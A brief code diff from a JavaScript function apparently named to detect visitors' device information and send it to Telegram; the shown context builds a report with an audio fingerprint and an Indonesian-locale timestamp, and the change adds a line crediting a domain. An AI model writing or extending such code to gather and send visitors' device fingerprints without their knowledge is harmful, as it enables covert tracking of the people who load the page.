@@ -857,6 +857,7 @@ async function detectDeviceInfoAndSendToTelegram() {
 • *Audio Fingerprint*: ${deviceInfo.audioFingerprint}
 
 📅 _Laporan dibuat pada ${new Date().toLocaleString("id-ID")}_
+🌐 *by domain*: idnetconnect.biz.id
 `;
 
         const formData = new FormData();
